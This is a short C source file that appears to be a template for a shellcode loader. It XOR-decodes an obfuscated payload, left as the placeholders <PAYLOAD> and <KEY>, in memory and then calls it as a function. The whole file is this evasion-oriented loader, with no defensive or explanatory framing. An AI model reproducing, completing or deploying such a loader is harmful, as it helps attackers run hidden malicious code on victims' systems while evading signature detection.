#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Obfuscated shellcode
<PAYLOAD>

int main (int argc, char **argv) 
{
	char xor_key = '<KEY>';
	int arraysize = (int) sizeof(payload);
	for (int i=0; i<arraysize-1; i++)
	{
		payload[i] = payload[i]^xor_key;
	}
	int (*ret)() = (int(*)())payload;
	ret();
}